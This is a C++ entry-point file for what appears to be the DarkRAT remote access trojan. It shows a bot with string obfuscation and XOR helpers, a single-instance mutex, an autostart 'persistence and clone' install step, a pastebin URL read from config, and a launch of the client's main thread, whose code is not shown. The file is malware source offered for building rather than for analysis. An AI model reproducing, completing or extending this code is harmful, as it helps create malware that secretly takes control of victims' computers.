#include <stdio.h>
#include <iostream>
#include <fstream>
#include <windows.h>
#include <Urlmon.h> 
#include <time.h>
#include <lm.h>
#include <vector>
#include <thread>
#include <ShellAPI.h>
#include <wbemidl.h>
#include <list>
#include "BuildSystem\json.h"
#include "BuildSystem\config.h"
#include <conio.h>
#include "obfuscat.h"
#include "URL.h"
#include <atlbase.h>
#include <wtypes.h>
#include <comutil.h>
#include "Helpers.hpp"
#include "OsHelpers.hpp"
#include "DarkRequest.h"
#include "XOR.h"
#include "spiderrun.h"
#include "Client.h"


#pragma comment(lib,"comsuppw.lib")
#pragma comment( lib, "Urlmon.lib" )
#pragma comment(lib, "netapi32.lib")
#pragma comment(lib,"wbemuuid")



struct ComInit
{
	HRESULT hr;
	ComInit() : hr(::CoInitialize(nullptr)) {}
	~ComInit() { if (SUCCEEDED(hr)) ::CoUninitialize(); }
};



#if _DEBUG
int main(int argc, char* argv[]) {
#endif
#if NDEBUG 
int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, char*, int nShowCmd) {
#endif
		darkRat::config::config config = darkRat::config::load();
		//Config config;
		std::thread darkMain;

		//Check if the Bot is Running
		std::string mutex = OBFUSCATE("Local\\") + config.mutex;
		CreateMutexA(0, FALSE, mutex.c_str()); // try to create a named mutex
		if (GetLastError() == ERROR_ALREADY_EXISTS) // did the mutex already exist?
			return -1; // quit; mutex is released automatically

		//Autostart  (with persistence) && Clone
		if (config.startup == "true") {
			std::string insatlled = Helpers::installedOrnot();
			if (insatlled == OBFUSCATE("restart")) {
				return 0;
			}
		}

		std::cout << " WTF:" << config.pastebinUrl << std::endl;
		//system("pause");
		darkMain = std::thread(Client::darkMainThread);
		darkMain.join();
		/*
		while (true)
		{
			Sleep(1000000);
		}
		*/
}
